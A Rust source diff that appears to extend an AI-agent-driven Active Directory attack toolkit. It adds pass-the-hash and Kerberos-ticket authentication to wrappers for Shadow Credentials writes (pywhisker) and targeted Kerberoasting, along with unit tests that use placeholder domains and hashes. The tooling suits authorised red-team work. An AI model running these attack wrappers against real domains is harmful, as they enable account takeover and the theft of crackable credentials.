@@ -242,26 +242,61 @@ pub async fn gmsa_read_password_bloodyad(args: &Value) -> Result<ToolOutput> {
 
 /// Manipulate msDS-KeyCredentialLink via `pywhisker.py`.
 ///
-/// Required args: `domain`, `username`, `password`, `dc_ip`, `target_samaccountname`
+/// Required args: `domain`, `username`, `dc_ip`, `target_samaccountname`
+/// Auth — one of (precedence: ticket_path > hash > password):
+/// - `ticket_path` — Kerberos ccache (`-k --no-pass` + `KRB5CCNAME`)
+/// - `hash` — NTLM pass-the-hash (`--hashes :NTHASH`)
+/// - `password` — plaintext bind
+///
 /// Optional args: `action` (default: `"add"`)
+///
+/// Without the hash/Kerberos branches, DACL-holding machine accounts and
+/// captured NTLM-only principals can't drive Shadow Credentials writes even
+/// though the underlying `pywhisker.py` supports both auth modes — the LLM
+/// wrapper was the only bottleneck.
 pub async fn pywhisker(args: &Value) -> Result<ToolOutput> {
+    build_pywhisker(args)?.execute().await
+}
+
+#[doc(hidden)]
+pub fn build_pywhisker(args: &Value) -> Result<CommandBuilder> {
     let domain = required_str(args, "domain")?;
     let username = required_str(args, "username")?;
-    let password = required_str(args, "password")?;
     let dc_ip = required_str(args, "dc_ip")?;
     let target_sam = required_str(args, "target_samaccountname")?;
     let action = optional_str(args, "action").unwrap_or("add");
+    let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
+    let hash = optional_str(args, "hash").filter(|s| !s.is_empty());
 
-    CommandBuilder::new("pywhisker")
+    let mut cmd = CommandBuilder::new("pywhisker")
         .flag("-d", domain)
         .flag("-u", username)
-        .flag("-p", password)
         .flag("--target", target_sam)
         .flag("--action", action)
-        .flag("--dc-ip", dc_ip)
-        .timeout_secs(120)
-        .execute()
-        .await
+        .flag("--dc-ip", dc_ip);
+
+    if let Some(tpath) = ticket_path {
+        // Kerberos: pywhisker uses standard impacket-style `-k` + KRB5CCNAME.
+        // `--no-pass` prevents interactive prompt when neither password nor
+        // hash is on the command line.
+        cmd = cmd
+            .arg("-k")
+            .arg("--no-pass")
+            .env("KRB5CCNAME", tpath)
+            .env("KRB5_CONFIG", format!("{tpath}.krb5.conf:/etc/krb5.conf"));
+    } else if let Some(h) = hash {
+        let nt = if h.contains(':') {
+            h.to_string()
+        } else {
+            format!(":{h}")
+        };
+        cmd = cmd.arg("--hashes").arg(nt).arg("--no-pass");
+    } else {
+        let password = required_str(args, "password")?;
+        cmd = cmd.flag("-p", password);
+    }
+
+    Ok(cmd.timeout_secs(120))
 }
 
 /// Perform targeted Kerberoasting.
@@ -288,9 +323,10 @@ pub async fn targeted_kerberoast(args: &Value) -> Result<ToolOutput> {
 pub fn build_targeted_kerberoast(args: &Value) -> Result<CommandBuilder> {
     let domain = required_str(args, "domain")?;
     let username = required_str(args, "username")?;
-    let password = required_str(args, "password")?;
     let dc_ip = required_str(args, "dc_ip")?;
     let target_user = required_str(args, "target_user")?;
+    let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
+    let hash = optional_str(args, "hash").filter(|s| !s.is_empty());
 
     let etype_mask = etype_hint_bitmask(args);
 
@@ -299,10 +335,31 @@ pub fn build_targeted_kerberoast(args: &Value) -> Result<CommandBuilder> {
         // no etype selector. `-request-user` limits the dispatch to the
         // single SPN account so we don't trigger a forest-wide kerberoast
         // pass that may relock other principals.
-        let target = credentials::impacket_target(Some(domain), username, Some(password), dc_ip);
-        CommandBuilder::new("impacket-GetUserSPNs")
-            .arg(target)
-            .arg("-dc-ip")
+        let mut cmd = CommandBuilder::new("impacket-GetUserSPNs");
+
+        if let Some(tpath) = ticket_path {
+            let target = credentials::impacket_target(Some(domain), username, None, dc_ip);
+            cmd = cmd
+                .arg(target)
+                .arg("-k")
+                .arg("-no-pass")
+                .env("KRB5CCNAME", tpath)
+                .env("KRB5_CONFIG", format!("{tpath}.krb5.conf:/etc/krb5.conf"));
+        } else if let Some(h) = hash {
+            let target = credentials::impacket_target(Some(domain), username, None, dc_ip);
+            cmd = cmd.arg(target);
+            for a in credentials::hash_args(h) {
+                cmd = cmd.arg(a);
+            }
+            cmd = cmd.arg("-no-pass");
+        } else {
+            let password = required_str(args, "password")?;
+            let target =
+                credentials::impacket_target(Some(domain), username, Some(password), dc_ip);
+            cmd = cmd.arg(target);
+        }
+
+        cmd.arg("-dc-ip")
             .arg(dc_ip)
             .arg("-request-user")
             .arg(target_user)
@@ -310,13 +367,33 @@ pub fn build_targeted_kerberoast(args: &Value) -> Result<CommandBuilder> {
             .arg(mask.to_string())
             .timeout_secs(120)
     } else {
-        CommandBuilder::new("targetedKerberoast.py")
+        let mut cmd = CommandBuilder::new("targetedKerberoast.py")
             .flag("-d", domain)
             .flag("-u", username)
-            .flag("-p", password)
             .flag("-t", target_user)
-            .flag("-dc-ip", dc_ip)
-            .timeout_secs(120)
+            .flag("-dc-ip", dc_ip);
+
+        if let Some(tpath) = ticket_path {
+            // targetedKerberoast.py is an impacket-based script; it honors
+            // `-k` + `KRB5CCNAME` and `-no-pass` (impacket single-dash form).
+            cmd = cmd
+                .arg("-k")
+                .arg("-no-pass")
+                .env("KRB5CCNAME", tpath)
+                .env("KRB5_CONFIG", format!("{tpath}.krb5.conf:/etc/krb5.conf"));
+        } else if let Some(h) = hash {
+            let nt = if h.contains(':') {
+                h.to_string()
+            } else {
+                format!(":{h}")
+            };
+            cmd = cmd.arg("-H").arg(nt).arg("-no-pass");
+        } else {
+            let password = required_str(args, "password")?;
+            cmd = cmd.flag("-p", password);
+        }
+
+        cmd.timeout_secs(120)
     };
     Ok(cmd)
 }
@@ -1398,6 +1475,203 @@ mod tests {
             args_vec.iter().all(|a| a != "-supported-enctypes"),
             "no etype_hint → must NOT pass -supported-enctypes"
         );
+    }
+
+    // ── hash / ticket_path auth for pywhisker & targeted_kerberoast ───────
+
+    #[test]
+    fn pywhisker_ticket_path_sets_krb5ccname_and_no_pass() {
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "dc_ip": "192.168.58.10",
+            "target_samaccountname": "dc01$",
+            "ticket_path": "/tmp/ares-tickets/admin.ccache",
+        });
+        let cmd = super::build_pywhisker(&args).unwrap();
+        let args_vec = cmd.args_for_test();
+        assert!(args_vec.iter().any(|a| a == "-k"));
+        assert!(args_vec.iter().any(|a| a == "--no-pass"));
+        assert!(args_vec.iter().all(|a| a != "-p"));
+        assert!(cmd
+            .env_vars_for_test()
+            .iter()
+            .any(|(k, v)| k == "KRB5CCNAME" && v == "/tmp/ares-tickets/admin.ccache"));
+    }
+
+    #[test]
+    fn pywhisker_hash_uses_hashes_flag() {
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "dc_ip": "192.168.58.10",
+            "target_samaccountname": "dc01$",
+            "hash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+        });
+        let cmd = super::build_pywhisker(&args).unwrap();
+        let args_vec = cmd.args_for_test();
+        let idx = args_vec
+            .iter()
+            .position(|a| a == "--hashes")
+            .expect("--hashes flag required for pass-the-hash");
+        assert_eq!(
+            args_vec.get(idx + 1).map(String::as_str),
+            Some(":aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"),
+            "NT-only hash must be prefixed with ':'"
+        );
+        assert!(args_vec.iter().any(|a| a == "--no-pass"));
+        assert!(args_vec.iter().all(|a| a != "-p"));
+    }
+
+    #[test]
+    fn pywhisker_hash_preserves_lm_nt_form() {
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "dc_ip": "192.168.58.10",
+            "target_samaccountname": "dc01$",
+            "hash": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
+        });
+        let cmd = super::build_pywhisker(&args).unwrap();
+        let args_vec = cmd.args_for_test();
+        let idx = args_vec.iter().position(|a| a == "--hashes").unwrap();
+        assert_eq!(
+            args_vec.get(idx + 1).map(String::as_str),
+            Some("aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"),
+        );
+    }
+
+    #[test]
+    fn pywhisker_password_branch_still_works() {
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "password": "P@ssw0rd!",
+            "dc_ip": "192.168.58.10",
+            "target_samaccountname": "dc01$",
+        });
+        let cmd = super::build_pywhisker(&args).unwrap();
+        let args_vec = cmd.args_for_test();
+        assert!(args_vec.iter().any(|a| a == "-p"));
+        assert!(args_vec.iter().all(|a| a != "--hashes"));
+        assert!(args_vec.iter().all(|a| a != "-k"));
+    }
+
+    #[test]
+    fn pywhisker_missing_all_auth_errors() {
+        // No password, no hash, no ticket_path → password required error.
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "dc_ip": "192.168.58.10",
+            "target_samaccountname": "dc01$",
+        });
+        assert!(super::build_pywhisker(&args).is_err());
+    }
+
+    #[test]
+    fn targeted_kerberoast_no_etype_ticket_path_sets_kerberos_env() {
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "dc_ip": "192.168.58.10",
+            "target_user": "svc_sql",
+            "ticket_path": "/tmp/ares-tickets/admin.ccache",
+        });
+        let cmd = super::build_targeted_kerberoast(&args).unwrap();
+        let args_vec = cmd.args_for_test();
+        // No-etype branch uses targetedKerberoast.py (-t flag present).
+        assert!(args_vec.iter().any(|a| a == "-t"));
+        assert!(args_vec.iter().any(|a| a == "-k"));
+        assert!(args_vec.iter().any(|a| a == "-no-pass"));
+        assert!(args_vec.iter().all(|a| a != "-p"));
+        assert!(cmd
+            .env_vars_for_test()
+            .iter()
+            .any(|(k, v)| k == "KRB5CCNAME" && v == "/tmp/ares-tickets/admin.ccache"));
+    }
+
+    #[test]
+    fn targeted_kerberoast_no_etype_hash_uses_capital_h() {
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "dc_ip": "192.168.58.10",
+            "target_user": "svc_sql",
+            "hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
+        });
+        let cmd = super::build_targeted_kerberoast(&args).unwrap();
+        let args_vec = cmd.args_for_test();
+        // targetedKerberoast.py uses `-H` (single-dash impacket style) for hashes.
+        let idx = args_vec.iter().position(|a| a == "-H").unwrap();
+        assert_eq!(
+            args_vec.get(idx + 1).map(String::as_str),
+            Some(":31d6cfe0d16ae931b73c59d7e0c089c0"),
+        );
+        assert!(args_vec.iter().any(|a| a == "-no-pass"));
+        assert!(args_vec.iter().all(|a| a != "-p"));
+    }
+
+    #[test]
+    fn targeted_kerberoast_etype_ticket_path_sets_kerberos_env() {
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "dc_ip": "192.168.58.10",
+            "target_user": "svc_sql",
+            "ticket_path": "/tmp/ares-tickets/admin.ccache",
+            "etype_hint": ["aes256-cts-hmac-sha1-96"],
+        });
+        let cmd = super::build_targeted_kerberoast(&args).unwrap();
+        let args_vec = cmd.args_for_test();
+        assert!(args_vec.iter().any(|a| a == "-supported-enctypes"));
+        assert!(args_vec.iter().any(|a| a == "-k"));
+        assert!(args_vec.iter().any(|a| a == "-no-pass"));
+        assert!(cmd
+            .env_vars_for_test()
+            .iter()
+            .any(|(k, v)| k == "KRB5CCNAME" && v == "/tmp/ares-tickets/admin.ccache"));
+        // Target string with no password (Kerberos path).
+        assert!(
+            args_vec
+                .iter()
+                .any(|a| a == "contoso.local/admin@192.168.58.10"),
+            "impacket target must be built without password for Kerberos auth; got: {args_vec:?}"
+        );
+    }
+
+    #[test]
+    fn targeted_kerberoast_etype_hash_uses_hashes_flag() {
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "dc_ip": "192.168.58.10",
+            "target_user": "svc_sql",
+            "hash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+            "etype_hint": ["aes256-cts-hmac-sha1-96"],
+        });
+        let cmd = super::build_targeted_kerberoast(&args).unwrap();
+        let args_vec = cmd.args_for_test();
+        assert!(args_vec.iter().any(|a| a == "-supported-enctypes"));
+        // impacket-GetUserSPNs uses `-hashes` (single-dash) for PtH.
+        let idx = args_vec.iter().position(|a| a == "-hashes").unwrap();
+        assert_eq!(
+            args_vec.get(idx + 1).map(String::as_str),
+            Some(":aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"),
+        );
+        assert!(args_vec.iter().any(|a| a == "-no-pass"));
+    }
+
+    #[test]
+    fn targeted_kerberoast_missing_all_auth_errors() {
+        // No etype, no password/hash/ticket → error.
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "dc_ip": "192.168.58.10",
+            "target_user": "svc_sql",
+        });
+        assert!(super::build_targeted_kerberoast(&args).is_err());
     }
 
     #[test]
